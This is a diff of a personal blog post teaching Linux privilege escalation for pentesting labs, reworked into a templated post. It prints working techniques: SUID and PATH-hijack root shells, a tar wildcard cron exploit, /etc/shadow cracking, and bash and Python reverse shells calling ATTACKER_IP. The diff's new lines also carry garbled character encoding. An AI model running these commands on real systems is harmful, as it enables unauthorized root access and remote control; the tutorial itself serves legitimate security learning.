@@ -1,16 +1,29 @@
-<!DOCTYPE html>
-<html lang="en" data-theme="dark">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Linux Privilege Escalation — Vali Hakuryuko</title>
-  <meta name="description" content="A comprehensive guide to Linux privilege escalation techniques — SUID, sudo abuse, PATH hijacking, cronjobs, kernel exploits, and more." />
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=Outfit:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="../style.css" />
-  <link rel="stylesheet" href="../post.css" />
-  <style>
+---
+layout: post
+article: true
+slug: linux-privilege-escalation
+title: "Understanding Linux Privilege Escalation"
+description: "A focused guide to common Linux privilege escalation paths, including SUID abuse, cron jobs, weak permissions, and systematic enumeration."
+excerpt: "A focused guide to common Linux privilege escalation paths, including SUID abuse, cron jobs, weak permissions, and systematic enumeration."
+post_subtitle: "A focused guide to common Linux privilege escalation paths, including SUID abuse, cron jobs, weak permissions, and systematic enumeration."
+summary: "A practical reference for enumerating Linux systems and validating the most common privilege escalation paths in labs or post-exploitation scenarios."
+target_lab: "Linux privilege escalation labs and post-exploitation scenarios"
+tools_used:
+  - "Bash"
+  - "LinPEAS"
+  - "GTFOBins"
+  - "sudo"
+takeaways:
+  - "Start with enumeration before reaching for any exploit."
+  - "Check SUID, sudo, cron, PATH, and writable scripts before chasing edge cases."
+  - "Validate every escalation path against the target's permissions and runtime context."
+date: 2025-07-30
+read_time: "~8 min read"
+permalink: /blog/Linux-Privilege-Escalation.html
+tags:
+  - "Linux"
+---
+<style>
     article h2 { font-family: var(--display); font-size: 1.45rem; font-weight: 700; margin: 3rem 0 1rem; letter-spacing: -0.02em; padding-top: 1rem; border-top: 1px solid var(--border); }
     article h2:first-child { border-top: none; margin-top: 0; }
     article h3 { font-family: var(--display); font-size: 1.1rem; font-weight: 600; margin: 1.75rem 0 0.75rem; color: var(--text); }
@@ -43,35 +56,8 @@
       .technique-grid { grid-template-columns: 1fr; }
     }
   </style>
-</head>
-<body class="post-page">
-  <nav>
-    <a href="../index.html" class="nav-logo"><span>~/</span>Vali</a>
-    <ul class="nav-links">
-      <li><a href="../index.html#about">About</a></li>
-      <li><a href="../blog.html">Blog</a></li>
-      <li><a href="../index.html#contact">Contact</a></li>
-    </ul>
-    <button class="theme-btn" onclick="toggleTheme()">[ theme ]</button>
-  </nav>
 
-  <div class="layout">
-    <header class="post-header">
-      <div class="post-breadcrumb">
-        <a href="../index.html">~</a> / <a href="../blog.html">blog</a> / linux-privilege-escalation
-      </div>
-      <div class="post-meta-row">
-        <span class="post-date">2025-07-30</span>
-        <span class="post-tag">linux</span>
-        <span class="post-read-time">~8 min read</span>
-      </div>
-      <h1 class="post-title">Understanding Linux Privilege Escalation</h1>
-      <p class="post-subtitle">
-        Different exploit paths to get root — SUID binaries, cron jobs, PATH hijacking, kernel exploits, and more. A practical reference for labs and real engagements.
-      </p>
-    </header>
-
-    <div class="toc">
+<div class="toc">
       <div class="toc-title">// contents</div>
       <ol>
         <li><a href="#enumeration">System Enumeration</a></li>
@@ -92,15 +78,15 @@
     <article>
 
       <div class="callout info">
-        <div class="callout-title">ℹ️ What is Privilege Escalation?</div>
-        <p>Privilege escalation is the process of gaining higher-level permissions than originally granted — most commonly going from a low-privilege shell to <strong>root</strong>. It's a core phase in any pentest after gaining initial access.</p>
+        <div class="callout-title">â„¹ï¸ What is Privilege Escalation?</div>
+        <p>Privilege escalation is the process of gaining higher-level permissions than originally granted â€” most commonly going from a low-privilege shell to <strong>root</strong>. It's a core phase in any pentest after gaining initial access.</p>
       </div>
 
       <h2 id="enumeration">System Enumeration</h2>
       <p>
         Before attempting any exploit, map out the target. Understand the OS version, running processes, users, network services, and file permissions. This is what separates a methodical pentester from someone just running scripts blindly.
       </p>
-      <span class="code-label">bash — key enumeration commands</span>
+      <span class="code-label">bash â€” key enumeration commands</span>
       <pre><code>uname -a           # kernel version and architecture
 id                 # current user and group membership
 whoami             # current user
@@ -109,20 +95,20 @@ ps aux             # running processes
 netstat -tulpn     # open ports and listening services
 find / -writable -type f 2>/dev/null  # world-writable files</code></pre>
       <div class="callout success">
-        <div class="callout-title">✅ Tip</div>
-        <p>Use automated enumeration scripts like <strong>LinPEAS</strong> or <strong>LinEnum</strong> to speed this up — but always understand what they're finding and why it matters.</p>
+        <div class="callout-title">âœ… Tip</div>
+        <p>Use automated enumeration scripts like <strong>LinPEAS</strong> or <strong>LinEnum</strong> to speed this up â€” but always understand what they're finding and why it matters.</p>
       </div>
 
       <h2 id="suid">SUID Exploitation</h2>
       <p>
         SUID (Set User ID) is a special file permission that lets a binary run as its <em>owner</em> rather than the user executing it. If a root-owned binary has SUID set and is exploitable, you can get a root shell.
       </p>
-      <span class="code-label">bash — find SUID binaries</span>
+      <span class="code-label">bash â€” find SUID binaries</span>
       <pre><code>find / -perm -4000 -type f 2>/dev/null</code></pre>
       <p>
-        Once you have a list, check each binary against <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> — a curated list of Unix binaries that can be abused. Common targets include <code>vim</code>, <code>nmap</code>, <code>python</code>, <code>bash</code>, and <code>find</code>.
+        Once you have a list, check each binary against <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> â€” a curated list of Unix binaries that can be abused. Common targets include <code>vim</code>, <code>nmap</code>, <code>python</code>, <code>bash</code>, and <code>find</code>.
       </p>
-      <span class="code-label">example — exploiting SUID python</span>
+      <span class="code-label">example â€” exploiting SUID python</span>
       <pre><code># If python has SUID:
 python -c 'import os; os.execl("/bin/sh", "sh", "-p")'</code></pre>
 
@@ -130,13 +116,13 @@ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'</code></pre>
       <p>
         Misconfigured sudo rules are one of the most common privesc vectors. If a user can run certain commands as root without a password, those commands can often be abused.
       </p>
-      <span class="code-label">bash — check sudo privileges</span>
+      <span class="code-label">bash â€” check sudo privileges</span>
       <pre><code>sudo -l</code></pre>
       <p>
         Look for entries like <code>(ALL) NOPASSWD: /usr/bin/vim</code>. Then check GTFOBins for the allowed binary. Editors, scripting languages, and file utilities are especially dangerous with sudo rights.
       </p>
       <div class="callout warning">
-        <div class="callout-title">⚠️ Misconfiguration to avoid</div>
+        <div class="callout-title">âš ï¸ Misconfiguration to avoid</div>
         <p>Never grant <code>ALL</code> or <code>NOPASSWD</code> without tight restrictions. Even seemingly harmless binaries like <code>less</code>, <code>awk</code>, or <code>env</code> can be exploited.</p>
       </div>
 
@@ -144,7 +130,7 @@ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'</code></pre>
       <p>
         When a script or binary calls another program using a <em>relative</em> path (e.g., just <code>ls</code> instead of <code>/bin/ls</code>), it searches through directories in <code>$PATH</code> in order. If you can write to a directory that appears earlier in PATH, you can plant a malicious binary with the same name.
       </p>
-      <span class="code-label">bash — PATH hijack example</span>
+      <span class="code-label">bash â€” PATH hijack example</span>
       <pre><code># If a SUID script calls "service" without an absolute path:
 echo '/bin/bash -p' > /tmp/service
 chmod +x /tmp/service
@@ -155,7 +141,7 @@ export PATH=/tmp:$PATH
       <p>
         Cron jobs run scheduled tasks, often as root. If the script being executed is writable by your user, you can replace its contents and wait for root to run it for you.
       </p>
-      <span class="code-label">bash — enumerate cron jobs</span>
+      <span class="code-label">bash â€” enumerate cron jobs</span>
       <pre><code>cat /etc/crontab
 ls -la /etc/cron.*
 crontab -l             # current user's crontab
@@ -166,9 +152,9 @@ cat /var/spool/cron/*  # other users' crontabs (if readable)</code></pre>
 
       <h2 id="wildcard">Wildcard Expansion Exploitation</h2>
       <p>
-        Some commands expand wildcards (<code>*</code>) in a way that can be abused. The classic example is <code>tar</code> — if a cron job runs <code>tar czf backup.tar.gz *</code> in a directory you control, you can create files with names that look like tar options.
+        Some commands expand wildcards (<code>*</code>) in a way that can be abused. The classic example is <code>tar</code> â€” if a cron job runs <code>tar czf backup.tar.gz *</code> in a directory you control, you can create files with names that look like tar options.
       </p>
-      <span class="code-label">bash — tar wildcard exploit</span>
+      <span class="code-label">bash â€” tar wildcard exploit</span>
       <pre><code># Create these files in the target directory:
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
 echo "" > "--checkpoint-action=exec=sh shell.sh"
@@ -180,12 +166,12 @@ echo "" > "--checkpoint=1"
 
       <h2 id="capabilities">Capabilities Enumeration</h2>
       <p>
-        Linux capabilities are a fine-grained alternative to SUID — they give a binary specific root powers without full root access. Some capabilities are just as dangerous as SUID and are often overlooked.
+        Linux capabilities are a fine-grained alternative to SUID â€” they give a binary specific root powers without full root access. Some capabilities are just as dangerous as SUID and are often overlooked.
       </p>
-      <span class="code-label">bash — find binaries with capabilities</span>
+      <span class="code-label">bash â€” find binaries with capabilities</span>
       <pre><code>getcap -r / 2>/dev/null</code></pre>
       <p>
-        Look for <code>cap_setuid+ep</code> — if Python, Perl, or Ruby has this, you can spawn a root shell. Check GTFOBins under the "Capabilities" filter for exploitation methods.
+        Look for <code>cap_setuid+ep</code> â€” if Python, Perl, or Ruby has this, you can spawn a root shell. Check GTFOBins under the "Capabilities" filter for exploitation methods.
       </p>
 
       <h2 id="services">Local Service Exploitation</h2>
@@ -193,19 +179,19 @@ echo "" > "--checkpoint=1"
         Services running on localhost (only accessible from the machine itself) are often less hardened than internet-facing services. Look for databases, internal APIs, or admin panels running on non-standard ports.
       </p>
       <ul>
-        <li><strong>Redis with no auth</strong> — can write SSH keys or cron jobs as root</li>
-        <li><strong>MySQL running as root</strong> — can use <code>SELECT INTO OUTFILE</code> to write files</li>
-        <li><strong>Writable Docker socket</strong> — mount host filesystem and escape container</li>
+        <li><strong>Redis with no auth</strong> â€” can write SSH keys or cron jobs as root</li>
+        <li><strong>MySQL running as root</strong> â€” can use <code>SELECT INTO OUTFILE</code> to write files</li>
+        <li><strong>Writable Docker socket</strong> â€” mount host filesystem and escape container</li>
       </ul>
-      <span class="code-label">bash — find internal services</span>
+      <span class="code-label">bash â€” find internal services</span>
       <pre><code>ss -tulpn
 netstat -tulpn 2>/dev/null</code></pre>
 
       <h2 id="unshadow">Unshadow Attack</h2>
       <p>
-        If you can read both <code>/etc/passwd</code> and <code>/etc/shadow</code>, you can combine them and attempt to crack password hashes offline — much faster than online brute-forcing.
+        If you can read both <code>/etc/passwd</code> and <code>/etc/shadow</code>, you can combine them and attempt to crack password hashes offline â€” much faster than online brute-forcing.
       </p>
-      <span class="code-label">bash — unshadow and crack</span>
+      <span class="code-label">bash â€” unshadow and crack</span>
       <pre><code>unshadow /etc/passwd /etc/shadow > unshadowed.txt
 
 # Crack with John the Ripper:
@@ -216,9 +202,9 @@ hashcat -m 1800 unshadowed.txt rockyou.txt</code></pre>
 
       <h2 id="reverse-shell">Reverse Shell</h2>
       <p>
-        A reverse shell makes the target machine connect <em>back to you</em> rather than you connecting to it — useful when inbound ports are blocked. After getting a low-priv shell, you can use it to chain further exploitation.
+        A reverse shell makes the target machine connect <em>back to you</em> rather than you connecting to it â€” useful when inbound ports are blocked. After getting a low-priv shell, you can use it to chain further exploitation.
       </p>
-      <span class="code-label">bash — classic reverse shell payload</span>
+      <span class="code-label">bash â€” classic reverse shell payload</span>
       <pre><code># On attacker machine, start listener:
 nc -lvnp 4444
 
@@ -228,7 +214,7 @@ bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
 # Python alternative:
 python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'</code></pre>
       <div class="callout warning">
-        <div class="callout-title">⚠️ Reminder</div>
+        <div class="callout-title">âš ï¸ Reminder</div>
         <p>Only use reverse shells on systems you own or have explicit authorization to test. Unauthorized access is illegal.</p>
       </div>
 
@@ -237,9 +223,9 @@ python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444
         If a locally installed application has a memory corruption vulnerability, you can exploit it to get a root shell. This is more advanced and typically requires understanding of stack layout, calling conventions, and protections like ASLR and NX.
       </p>
       <ul>
-        <li><strong>Buffer Overflow</strong> — overwrite the return address to redirect execution</li>
-        <li><strong>Format String</strong> — use <code>%n</code> specifiers to write arbitrary memory</li>
-        <li><strong>ROP Chains</strong> — chain existing code gadgets to bypass NX</li>
+        <li><strong>Buffer Overflow</strong> â€” overwrite the return address to redirect execution</li>
+        <li><strong>Format String</strong> â€” use <code>%n</code> specifiers to write arbitrary memory</li>
+        <li><strong>ROP Chains</strong> â€” chain existing code gadgets to bypass NX</li>
       </ul>
       <p>
         Tools: <strong>GDB + pwndbg</strong>, <strong>pwntools</strong> (Python), <strong>checksec</strong> to inspect binary protections, <strong>Exploit-DB</strong> for existing PoCs.
@@ -247,9 +233,9 @@ python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444
 
       <h2 id="kernel">Kernel Exploitation</h2>
       <p>
-        Unpatched kernel vulnerabilities can be exploited to go straight from any user to root. These are high-impact but also risky — a bad exploit can crash the system. Identify the exact kernel version first, then search for known CVEs.
+        Unpatched kernel vulnerabilities can be exploited to go straight from any user to root. These are high-impact but also risky â€” a bad exploit can crash the system. Identify the exact kernel version first, then search for known CVEs.
       </p>
-      <span class="code-label">bash — identify kernel and find exploits</span>
+      <span class="code-label">bash â€” identify kernel and find exploits</span>
       <pre><code>uname -r    # e.g. 4.4.0-116-generic
 
 # Use linux-exploit-suggester:
@@ -262,23 +248,8 @@ python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444
       <hr />
 
       <div class="callout success">
-        <div class="callout-title">✅ Key Takeaways</div>
-        <p>Privilege escalation is mostly about <strong>thorough enumeration first</strong>. Run LinPEAS, check SUID/capabilities/sudo rules, look for writable cron scripts, and always verify kernel version. The path to root is almost always something simple that was misconfigured — not some 0-day.</p>
+        <div class="callout-title">âœ… Key Takeaways</div>
+        <p>Privilege escalation is mostly about <strong>thorough enumeration first</strong>. Run LinPEAS, check SUID/capabilities/sudo rules, look for writable cron scripts, and always verify kernel version. The path to root is almost always something simple that was misconfigured â€” not some 0-day.</p>
       </div>
 
     </article>
-
-    <div class="post-footer">
-      <a href="../blog.html" class="btn">← Back to blog</a>
-      <a href="burp-suite-basics.html" class="btn btn-accent">Getting Started with Burp Suite →</a>
-    </div>
-  </div>
-
-  <footer>
-    <span>© 2025 Vali Hakuryuko</span>
-    <span class="footer-back" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑ back to top</span>
-  </footer>
-
-  <script src="../script.js"></script>
-</body>
-</html>
